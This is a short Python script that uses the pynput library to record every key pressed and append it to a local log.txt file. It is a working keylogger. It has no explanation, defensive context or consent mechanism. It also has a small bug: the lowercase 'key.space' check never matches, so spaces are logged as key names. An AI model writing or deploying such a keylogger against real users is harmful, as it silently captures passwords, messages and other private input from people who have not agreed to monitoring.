from pynput.keyboard import Listener
def writetofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    if(letter=='key.space'):
        letter=" "
    if (letter == 'Key.shift_r'):
        letter = ''
    if (letter == "Key.ctrl_l"):
        letter = ""
    if (letter == "Key.enter"):
        letter = "\n"
    with open('log.txt', 'a') as f1:
       f1.write(letter)
with Listener(on_press=writetofile) as l:
    l.join()